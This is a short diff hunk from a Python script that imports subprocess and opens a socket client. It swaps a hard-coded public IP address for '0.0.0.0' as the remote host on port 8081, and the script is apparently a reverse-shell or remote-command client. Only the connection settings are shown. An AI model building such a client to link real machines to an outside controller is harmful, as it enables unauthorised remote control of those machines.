@@ -6,7 +6,7 @@ import subprocess
 
 
 # Setting Up IP/Sockets
-REMOTE_HOST = '77.222.105.230' 
+REMOTE_HOST = '0.0.0.0' 
 REMOTE_PORT = 8081 # 2222
 FORMAT = 'utf-8'
 client = socket.socket()
